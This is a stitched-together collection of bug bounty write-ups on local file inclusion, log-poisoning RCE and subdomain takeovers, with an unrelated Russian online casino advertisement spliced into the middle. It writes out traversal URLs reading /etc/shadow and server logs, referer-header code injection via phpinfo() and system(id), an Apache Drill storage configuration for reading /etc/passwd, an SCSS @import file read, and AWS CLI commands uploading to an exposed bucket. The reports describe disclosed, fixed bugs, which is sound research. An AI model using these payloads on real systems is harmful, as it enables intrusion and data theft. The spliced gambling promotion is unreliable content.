https://netweb.telekom.de/netweb/gui/help.php?HELPFILE=../../../../../../../../../../../../../pkg/moip/netinfo/logs/apache-netweb-P/error.log Press enter or click to view image in full size error.log output So while running dirb on host I found file soap.php, that showed some errors that ended inside error.log , and one of the data inside log was referer value. Press enter or click to view image in full size soap.php error inside error.log Running simple test to see if referer value is executed: Press enter or click to view image in full size Running curl with referer value 0f 58–8 to see if value 50 is inside output. And again Bingo: 58–8 evaluated and 50 is output inside error.log. And for POC let’s run phpinfo() : Press enter or click to view image in full size setting referer to phpinfo() . And output: Press enter or click to view image in full size phpinfo() executed inside error.log file And the full report: Press enter or click to view image in full size Full report sent to Deutche Telekom Bug Bounty Reported: April 10 2017 Fixed: Sometime in August Daniel Maksimovic ( maxonebt4@gmail.com ) https://www.linkedin.com/in/daniel-maksimovic-73537882/ Security -- -- 11 Written by Daniel Maksimovic 294 followers · 14 following A pentester.

Few months back i got private invite in hackerone platform. As you know Recon plays a major role while hacking on a program. Recon doesn’t always mean to find subdomains belonging to a company, it also could relate to finding out how a company is setting up its properties and what resources they are using. What is LFI? Local File inclusion (LFI), or simply File Inclusion, refers to an inclusion attack through which an attacker can trick the web application in including files on the web server by exploiting functionality that dynamically includes local files or scripts. The consequence of a successful LFI attack includes Directory Traversal and Information Disclosure as well as Remote Code Execution. Typically, Local File Inclusion (LFI) occurs, when an application gets the path to the file that has to be included as an input without treating it as untrusted input. This would allow a local file to be supplied to the include statement. After looking into shodan and crt.sh for that domain I found one , http://ec2-xx-xx-xxx-xxx.us-west-2.compute.amazonaws.com:8047 and Istarted digging there and no success for intial hours.Later i found tabs like Query , storage tab , so i quickly gone to their document to read all things and how it works at https://drill.apache.org/docs/ . Few things on query : The query specifies the data source location and includes data casting.Specifying the Data Source Location ¶The optional USE statement runs subsequent queries against a particular storage plugin . The USE statement typically saves typing some of the storage plugin information in the FROM statement. If you omit the USE statement, specify a storage plugin, such as dfs, and optionally a workspace, such as default, and a path to the data source using dot notation and back ticks. For example: d fs.`default`.`/Users/drill-user/apache-drill-1.1.0/log/sqlline_queries.json `; After understating few document , Itook help from the great hacker Jobert Abma (Co-founder of HackerOne), he told we can try to get LFI. Wait for a moment and listen music. after few minutes jobert come up with below json file , which he wrote as dfs storage method : { \"type\": \"file\", \"enabled\": true, \"connection\": \"file:///\", \"config\": null, \"workspaces\": { \"etc\": { \"location\": \"/etc\", \"writable\": false, \"defaultInputFormat\": \"tsv\" } }, \"formats\": { \"tsv\": { \"type\": \"text\", \"extensions\": [ \"tsv\"], \"delimiter\": \"\\t\" } } } and just call that from query tab like: select * from dfs.etc.`passwd` and wow! all we got is: Press enter or click to view image in full size So , It’s time to partyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy! We then tried for multiple json file as dfs storage method and we got success. woot woot! I always believed that sharing is caring, and I have been learning from multiple security researchers. Hope You liked this finding. Many more are coming. Stay tuned. DM is open for any questions on twitter ( Gujjuboy10x00 , hackerone.com/gujjuboy10x00).

Avinash Jain (@logicbomb) 3 min read · Apr 19, 2018 -- 13 Listen Share Hi Guys, This blog is about how I was able to get Remote Code Execution (RCE) from Local file inclusion (LFI) in one of the India’s property buyers & sellers company. Let’s see what was the complete scenario- As a bugbounty hunter the most important thing that I feel is the approach which we try or follow to exploit the vulnerability and which ultimately leads to have a much more impact from the vulnerability and the same I carried here. While searching for the vulnerabilities, I found LFI in the target site- https://www.victimsite.com/forum/attachment-serve?name=../../../../../../../../../../etc/shadow&path =. As you can see parameter “name” was vulnerable to LFI. Press enter or click to view image in full size LFI (/etc/shadow) I was confirmed that LFI was there and so now my target was to escalate it to get RCE. Before that, I have read many articles on how to get RCE from LFI and this one helped me a little here — https://medium.com/@p4c3n0g3/lfi-to-rce-via-access-log-injection-88684351e7c0 . Now the idea was to get access to some file may be log files which could provide some user controller input (in order to run some command) . So I tried reading access logs ,error logs , different location to access them. Press enter or click to view image in full size Access Logs response But it seems the user with which I got LFI didn’t have access to access logs files. Did a little reading,researching and I came to know that “/proc/self/fd” provides symbolic shortcut to access logs and various other system related file. So I tried reading those in search for access logs- Press enter or click to view image in full size /proc/self files and I run intruder over /proc/self/fd/{number} and one of the fd files provided me access to access logs — Press enter or click to view image in full size Access log file and what caught my attention here was “referer” header because I knew that it was something which is under user controlled input. Time to execute some command. I added ‘referer’ header in the HTTP request , set its value to system(id) and forwarded it- Press enter or click to view image in full size LFI to RCE and a cheerful response :) Press enter or click to view image in full size RCE Response So this is how I was able to get Remote code execution(RCE) from Local file inclusion(LFI)! :) Report details- 13-April-2018 — Bug reported to the concerned company. 16-April-2018 — Bug was marked fixed. 16-April-2018 — Re-tested and confirmed the fix Reward in progress.

So the story begins when I visited a scope, one of the subdomains and I received a certificate error. I removed SSL from the protocol and used HTTP only and the site opened without any certificate error. The Site was giving 404 errors in the index page with pantheon stating “Unknown Site”, I felt it might be vulnerable to subdomain takeover issue. Without wasting any time I signed up for pantheon, added payment details and created a sandbox domain, installed WordPress and added simple Title on the homepage as ” Subdomain Takeover”. The sandbox domain provided by pantheon looked like http://dev-subdomaintakeover[.]patheonsite.io/ And then I added the vulnerable domain to my pantheon account or routed the sandbox domain to vulnerable subdomain. and within few seconds the site was updated with my sandbox domain content. The same method was used to hack the website belonging to the current president of the United States Of America Donald J Trump.

Here’s the full content:\n\nEscalating subdomain takeovers to steal cookies by abusing document.domain takemyhand - security blog About Escalating subdomain takeovers to steal cookies by abusing document.domain May 24, 2019 • t4kemyh4nd H i everyone, It's been a really long time since I've blogged about anything. Mainly because I got a job as security analyst- therefore I've been very busy. And I also got into Synack! This blog post focuses on one of my recent findings, how I was able to escalate an out of scope subdomain takeover to steal the session cookies. And how I also thought of a few more methods to escalate it, affecting the main domain. Before I get started with the bug, I would like to talk a little about same-origin policy. If 2 websites want to communicate with each other, or perhaps if 2 hosts want to interact with each other, there could be mainly 2 ways to go around this. The book \"Tangled Web\" (a great book, do read it) states the following: \" Attempts to broaden origins or facilitate cross-domain interactions are more common. The two broadly sup- ported ways of achieving these goals are document.domain and postMessage(...)\" DOCUMENT.DOMAIN This JavaScript property permits any two cooperating websites that share a common top-level domain (such as example.com , or even just .com ) to agree that for the purpose of future same-origin checks, they want to be considered equivalent. So basically, if login.example.com and www.example.com both explicitly set their document.domain to example.com, this will lax the same-origin policy checks thereafter. Exploitation I was hunting on the Postmates bug bounty program from H1. Now this program has a limited scope. I came across an [[in-scope]] endpoint like the following: https://raster-static.postmates.com/?url= Now this endpoint was only was only accepting image links coming from subdomains of postmates.com. I thought, if somehow I can find a subdomain takeover, maybe I can find an SSRF or perhaps serve my own malicious content to the victim. So I went ahead and fired up some subdomain discovery tools and started sifting through them. I found one subdomain, impact.postmates.com , which was prone to a Github subdomain takeover. I went ahead and added the custom domain name to my test repo and the subdomain was mine. However, I couldn't have access to any backend, so an SSRF was impossible in this case. The max I could do was serve random JPEG's. Bummer. After a lot of time of thinking, something struck my mind. The main domain for users in Postmates is, postmates.com . Now, \"Tangled Web\" also states: \" Simply because l ogin.example.com has set its document.domain to example.com does not mean that it will be allowed to access content originating from the website hosted at http://example.com/ . That website needs to perform such an assignment, too, even if common sense would indicate that it is a no-op.\" So, if and only if, postmates.com has explicitly set it's document.domain, maybe I could set impact.postmates.com 's document.domain to postmates.com and access it's cookies somehow? Precursor: a.xyz.com can NOT set it's document.domain to a.a.xyz.com or b.xyz.com , but it CAN set it's document.domain to xyz.com . An example of changing the values of blog.takemyhand.xyz to other settings: That being said, I went ahead to check if postmates.com had explicitly set their document.domain. They had! Now, you have to keep in mind, that this attack worked only because the main domain of the program was postmates.com (that is, document.domain = postmates.com ) and not something like www.postmates.com ( document.domain possibly set to www.postmates.com , because then I could not set the document.domain of impact.postmates.com to www.postmates.com ). So now all I had to do was, using JS, set the document.domain to postmates.com , and add the following code in my javascript to steal the cookies from the main account: That's it, I could alert the cookies of postmates.com now, and possibly perform an account takeover, since I had complete access to the DOM of the main website. While working on this, I even thought of a few other creative ways to escalate an subdomain takeover to increase it's impact: Bypassing X-Frame-Options : SAMEORIGIN Bypassing CORS validation where the Access-Control-Allow-Origin is set to *.example.com (* being any subdomain) Bypassing URL validation wherever applicable (eg. open redirects to steal OAuth login tokens etc. Regards, t4kemyh4nd takemyhand - security blog takemyhand - security blog t4kemyh4nd 0xtakemyhand OSCE3 | AppSec engineer @ GitLab | Android, web, network, CTFs"}

Their bug bounty program is located here — https://owncloud.com/owncloud-bug-bounty-program/ and their H1 program is located here https://hackerone.com/owncloud Their bounty program looked nice and juicy and I wanted some dough ( 🤑 ) So I ran https://github.com/aboul3la/Sublist3r [pretty sure everyone is aware of this] and I came cross a domain that was displayed as Press enter or click to view image in full size So I did a quick search on their CNAME and it points to owncloud.fider.io but somehow wasn’t reflecting back on their feedback.owncloud.com domain. CNAME check tool I used — https://toolbox.googleapps.com/apps/dig/ I then registered on https://getfider.com/ a demo account and saw that they had a custom page to set whichever domain you wanted.

I cooked up an IP grabber and a cookies grabber code via CSS to show the escalation of this. Press enter or click to view image in full size I swiftly reported it and in 2 hours, the issue was fixed via email. I was then told to send the report on HackerOne and I got my bounty. I thought I would have gotten $5k for their subdomain takeover, but turns out it was $200 since .ownCloud was out of scope. However , I’d deem this as a very high security risk and the payout should have been more, but what can you do — the company has “more rights” to your inputs than you yourself. Grateful- but not satisfy. Timeline: 4/20/2019 issue was reported. — 2 hours later the issue was fixed. Via email talks 3 weeks 5/6/2019. Paid out on 5/7/2019–$200. Worth it? Not sure.

Blocked by login/pay wall? Read for free here : ( https://c2a.github.io/How-I-bought-a-subdomain-of-Tokopedia-website ). … Greetings. When digging some old emails, i found one of my findings on tokopedia.com, and I decided to make a write-up about it. Tokopedia is one of the few company from Indonesia, that host their own public Bug Bounty Program. You can read the rules and details here: https://github.com/tokopedia/Bug-Bounty . After reading their rules, I noticed that the targets is mainly set to wildcard domains (*.tokopedia.com and *.tokopedia.net). So i began to enumerate the subdomain using a couple of open source tools like sublist3r, knockpy, massdns, etc. I found some interesting subdomain where i found some interesting findings too ( The forgotten content : information disclosure and reflected XSS on Tokopedia ). But the one that catches my eyes is REDACTED.tokopedia.com, because when i access the subdomain, i was getting an ERR_NAME_NOT_RESOLVED error page from my browser. Using dig command in my terminal, turns out that the CNAME configuration is pointing to another Top Level Domain (REDACTED.com). So REDACTED.tokopedia.com is actually an alias for another different domain which is REDACTED.com. Surprisingly, when i checked the whois record, the domain is actually expired. So i head straight up to namecheap.com to check if it’s available to buy, and well, it is. Press enter or click to view image in full size Here comes the dilemma, I was really broke at that time (seriously), i can’t even afford a domain for $8 , PLUS , I’m still not sure whether this subdomain is actually takeover-able or not. I even consider to report this vulnerability without buying the domain, but i don’t think that’s a good proof of concept. So, decided to take the risk, borrowing $8 from my friend (kudos to Mr. N), then bought the domain. After pointing it to a free hosting service, i try to open the subdomain again, and well, i successfully taken over the subdomain because it’s now pointing to my own server. I decided to make some PoC for stored XSS, but stumble upon a problem because the cookies is set with secure flag, so the site needs to be hosted in https. After i set a free SSL certificate for REDACTED.com, another problem arise, the browser throws a privacy warning, because the site is accessed from REDACTED.tokopedia.com, while the certificate is signed for REDACTED.com. I got this from stackoverflow, the warning is different but you got the idea. They won’t allow me to make a *.tokopedia.com SSL certificate since it’s reserved by the company, so i decided to report it right away. We could still steal cookies if the user decided to click ‘ proceed to…’ button anyway, so yeah. Press enter or click to view image in full size NOTE: If you found a subdomain takeover, i think it’s not wise to show something unnecessary on the front page, the company won’t like it because users could saw it, and it’s bad for their reputations. This report is from my earlier days as a Bug Bounty Hunter, so showing “Subdomain taken over” on front page might not be the best idea. Instead, we could write our PoC on hidden html tag, and maybe showing “Under Maintenance” on the front page. And don’t forget to randomize the file name we hosted on that subdomain so it won’t be accidentally found by users. Well, the Security Team verified my report, and it’s a valid security bug with High Severity, and they decided to reward me. Spending 8 bucks for three digits bounty rewards? I see this as an absolute win. Press enter or click to view image in full size Thanks. Timeline: July 27 2019: Report sent. July 29 2019: Security team verified the report, valid with High Severity.

{"source_url": "https://offensi.com/2019/01/31/lfi-in-apigee-portals/", "title": "LFI in Apigee portals – Offensi", "friendly_explanation": "This is a bug bounty writeup from https://offensi.com/2019/01/31/lfi-in-apigee-portals/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLFI in Apigee portals – Offensi Contact LFI in Apigee portals 31 January 2019 / wtm@offensi.com / 0 Comments Introduction Apigee provides clients with an API management platform that enables them to design, secure, deploy, monitor, and scale API’s. Furthermore Apigee provides clients with a customizable developer portal to enable developers to consume API’s easily and securely, and to measure API performance and usage. Apigee was acquired by Google in 2016 and therefore it is considered in scope for the Google VRP , meaning that any valid vulnerability found in the Apigee platform will be rewarded. Creating a custom portal In order to interact with the development community, API providers can expose their API to the public by building a custom portal. Apigee portals are based on Drupal 7 and come with a preloaded set of options for users to customize. Users can modify the default theme, add pages and users, manage assets and publish API’s, as can be seen in the screenshot taken from the Portal management interface. When done editing, the portal manager publishes the portal on a subdomain of apigee.io. Healthapix.apigee.io shows a clear example of what the end result of a portal looks like. Customizing the stylesheet According to the documentation on https://docs-new.apigee.com , users can edit the style of the theme by using SCSS instead of CSS: The style rules are defined using Sassy Cascading Style Sheet (SCSS) . SCSS is a superset of Cascading Style Sheets (CSS), offering the following advantages: Global variables that can be re-used throughout the style sheet. Nested rules to save style sheet development time. Ability to create mixins and functions This implicates that on the server side compilation and conversion is taking place. After compilation completes regular CSS files are published to the portal. This process looks like something that might be worth taking a closer look at. The import directive When going through the language specific documentation on sass-lang.com, there is one directive that stands out from the rest: CSS has an import option that lets you split your CSS into smaller, more maintainable portions. The only drawback is that each time you use @import in CSS it creates another HTTP request. Sass builds on top of the current CSS @import but instead of requiring an HTTP request, Sass will take the file that you want to import and combine it with the file you’re importing into so you can serve a single CSS file to the web browser. In short, the import directive allows us to reference other SCSS files by using this syntax: @import ‘somefile’. When seeing this directive, the SASS compiler will automatically try to locate ‘somefile.scss’, ‘somefile.sass’, or ‘somefile’. Depending on the version of the compiler you are using you might see some small differences in behavior. Exploitation What happens if we reference an arbitrary file with @import ‘/etc/shadow’? This file does not contain valid SCSS code, so compilation will most likely fail. As can be seen in the image above compilation fails indeed, throwing an error which exposes the contents of /etc/shadow, which is only readable by user root. This particular bug was fixed within a matter of hours after submitting the details to Google. Thanks to Google for running the VRP the way they do!

And in such projects I do my best with results for customer and get maximum pleasure from the process. But the result of the last project just shocked me. I was asked to make a pentest for one Hosting Provider. I will not disclose the name of that company. And in my story I will use the name \"Hoster\". With hosting service webpage everything was standard. Offers to buy VDS, Domains, SSL certificates. First of all, I was surprised at how the user’s personal account was implemented. Proof of ownership of the email address during registration was not required. Ie it was possible to register with the email address steve.jobs@apple.com . Or even better — support@hoster.com . But fortunately, by analogy with such story , the disclosure of sensitive information support services didn't happen. However, it did happen when I created a test request for support and immediately checked the availability of neighbouring ID's of other support requests. Surprisingly, they were available. And it was possible to observe who and what registered with that Hoster. And what kind of problems are facing users. In general it's a usual IDOR vulnerability, which no one surprise for now . It was fixed asap. There were also several places with Stored XSS. There was also a Blind XSS which returned the Service Administrator Cookie to me. Thanks to this XSS, I was able to find out where the administrator interface is located, well, and in general I revealed a lot of interesting information. How many active users. How many domains are in control. How many VDS deployed. Payment history. And some other things… Press enter or click to view image in full size There were various problems with CSRF tokens that allowed to do a lot of dangerous things on my account on behalf of the user. And if there were places where CSRF tokens was implemented. Nobody planned to check them on the backend. As a result of my findings, some of the functionality was completely disabled. So for example, 2FA authentication was decided to temporarily remove as not implemented well. In the course of my work, I paid attention not only to security problems, but also to implementation errors or problems in the operation of some functionality. As a QA engineer I couldn't passing by this. In total, my issue tracker reached the number — 22. So many problems I found. The results were more than convincing. And I already planned to finish this project. But for some reason I remembered again the problem of the lack of confirmation of the owner of the email address during registration. And here I began to invent situations in which this could create maximum problems for the hosting company and its owners. At some point, I began to think about the connections of the owners of this hosting service with other projects of the same company. After a couple of minutes, I registered an account with the email address of another project of that company (let it be support@example.com ). Then I managed to link the domain example.com to my created account suppot@example.com . But I still could not control the content of the linked domain. But could perfectly send e-mails on behalf of the example.com service. Nice thing for phishing attack. I don't know where the reply letters came. Because I answered one such test letter to myself. But I did not get the answer. Probably it went back to the real owner of the email box support@example.com . And here something interesting happened and I decided to write this article. I managed to resolve the forgotten subdomain. Classic subdomain takeover vulnerability. You can read about it in great detail here . I do not know why, but I tried to add a binding to a nonexistent domain. Press enter or click to view image in full size And I did it!!! The subdomain was successfully created/added and I could control the contents of this subdomain!!! And the content was displayed! Press enter or click to view image in full size Wait a minute. How so? After all, the classic subdomain takeover vulnerability only works with already existing subdomains. And we are not allow to make a new one… This situation wasn't clear. Ie, okay, I was able to bypass the levels of validation of my relationship with example.com, which was never be mine (probably thanks to example.com in my account name). But how is it possible to add subdomains at all and control them without any checking components in the DNS A, TXT, CNAME records …? Usually it works like this — we’ll add a subdomain to you, only you prove that you can do it. Go to DNS and add that hash omnomnomtom0110 to TXT. But there was no such thing. Do you want admin.example.com subdomain? No problem! As if the vulnerability — Subdomain Takeover V2. I was able to communicate with the owners of the hosting service being tested and they opened a bit pandora’s box. It turned out the following. Hosting worked through CloudFlare. And he worked in a very tricky way. I will try to explain you in simple words. Roughly speaking, I am tell you, go to me, I will host you. Just delegate your domains to me. And then all incoming calls I send to CloudFlare, considering them to be correct. And if I was entrusted with the president.com domain, and one neighbour came and did a website with notour.president.com and also gave it to me for hosting, then my server, having access to CloudFlare and already having all rights to president.com , will add third level domain for a neighbour quickly and without any question. For all DNS informations which came from CloudFlare are correct. And CloudFlare trusts me as a Hoster. Of course, most hosting providers configure their own DNS services. But that company just transferred everything to CloudFlare from one configured user. So we have a Subdomain Takeover V2. For sure this worked only with those addresses that are already controlled by Hosting service. But in conjunction with the previously discovered admin service — this could play expensive joke with both the Hoster and the hosting service clients. At the moment, almost all critical vulnerabilities and bugs have been fixed. And I hope that no one else will decide to make such architectural delights after reading this story.

It’s a common Security issue what is actually developers mistake when they left a Unused/unclaimed 3rd party Service DNS CNAME record for a subdoamin of theirs and Hackers can claim those subdomains with the help of external services it pointing to what could lead to serious issues . You can learn more about Subdomain takeover from detectify blog . While testing flock.com I got a domain flock.co what is under flock company . So I stared looking at it’s subdomains and got subdomain newdev.flock.co . When I visited the subdomain in browser I got a error like below screenshot :- Press enter or click to view image in full size Error Page This took my attention . So I checked the DNS record for this domain . $ dig newdev.flock.co ; <<>> DiG 9.10.6 <<>> newdev.flock.co ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 13182 ;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;newdev.flock.co.

So I start looking at custom domain documents on readme.io website to understand how they works . From their document I understand that :- You need a subdomain pointing to your readme.io subdomain [ yoursubdomain.readme.io ] . Your subdomain should be configured in domains settings in following page https://dash.readme.io/project/<project _Name>/v1.0/domains So to takeover I need to check if cname.readme.io is alreday claimed of not . But Unfortunately it was already claimed :( . But I have seen many such services doesn’t force users to verify their ownership of domains by using same CNAME txt record like their service subdomain . So still there’s a hope . I opened a account in readme.io and I got a subdomain newdev.readme.io . Then I go to domains settings https://dash.readme.io/project/newdev/v1.0/domains and in Custom Domain Field used newdev.flock.co as value and save changes . Now when I visited newdev.flock.co It redirected me to http://newdev.flock.co/inactive this page what saying now that Not Yet Active. Press enter or click to view image in full size See page title ;) This is showing as I am using a trail account . In the webpage title you will see my project name what I used while creating the project . So now this domain is serving my contents from newdev.readme.io project page . How to avoid such issues ? :- Always update your DNS records . remove CNAME or any other DNS records what is not in used . If you find a security vulnerability feel free to contact them via security@flock.com Thanks for reading .

But what else an attacker can do? So Now as You know from starting there was a file _redirect.html was missing on the bucket that was set as index to that subdomain. So I created a File named _redirect.html and uploaded the file to the bucket via cli but now the error on bucket and the subdomain was changed to Access Denied 🤦‍♂️ root@kali:~# aws s3 cp _redirect.html s3://sl.target.com/ upload: ./Hacked.txt to s3://sl.target.com/_redirect.html Issue: I was able to find the s3 bucket connected with the website that provide content to the website and the bucket was insecure and had not properly configured so anyone with access to aws cli can upload, delete files from the bucket. But Uploading a File simply uploaded but due to default behaviour of the current policy the files are not accessible 😒 I was Confused what i should do now. So I decided to read AWS Cli documentations to learn about it more and after a few web pages i was able to find a solution to the issue Uploading Files again and granting permission to files: So I uploaded the files again to the bucket but this time i grant the read access to the files i uploaded and grant read access to AllUsers by command root@kali:~# aws s3 cp _redirect.html s3://sl.target.com/ –grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers upload: ./_redirect.html to s3://sl.target.com/_redirect.html After Uploading this File to the Bucket and granting Read Permission to AllUsers to this File I went to the subdomain itself and this time The Error was Gone on the Subdomain and My file _redirect.html was executed as Index So That’s all i did to takeover a subdomain without an actual subdomain takeover vulnerability but instead with an insecure bucket connected to the subdomain Thanks For Reading 💖 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading...

Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается.

Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины.

Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям.

Background First of all we would like to mention that this is not a specific issue that can be found just on Shopify, this is common to several others cloud service providers. In the past weeks / days we contacted several different cloud providers regarding this problem and we were impressed with the Shopify Security Guys: fast response, super aware of the problem and great communications. Really kudos to them, they really know how to deal with the cybersecurity research community. First of all what is Shopify? Let’s take a look at the Wikipedia description. Press enter or click to view image in full size Shopify of Wikipedia Basically, it is a cloud service provider that allows you to create an e-commerce website in a super easy way. Now if you are already familiar with the Subdomain Takeover vulnerability on Shopify you can directly jump to the end of this article where we show how to do it on a large scale. Subdomain Takeovers on Shopify During a BugBounty Program or a Pen Testing activity, if you encounter one of the two following web pages, you can have a Subdomain Takeover. Press enter or click to view image in full size If you see this page you have a potential SubDomain Takeover Press enter or click to view image in full size Another example of vulnerable page Let’s see what are the steps to be sure about it. First of all you can do a Subdomain Takeover on Shopify with two types of DNS records: Mapping with application name (CNAMES pointing to myshopname.myshopify.com) Mapping with DNS (CNAMES pointing to shops.myshopify.com) There could be also other methods too (maybe legacy), which we’ll investigate in the near future. Case #1 Mapping with application name In this example we setup a CNAME for shop.buckhacker.com pointing to buckhacker.shopify.com nslookup on shop.buckhacker.com Now if the shop name buckhacker is not claimed on Shopify we could claim it and perform the Subdomain Takeover. How we can check if a shop name is claimed or not ? During the account registration phase you are forced to choose your shop name. If you go on this page you can easy figure out if the shop name is available: Example of not 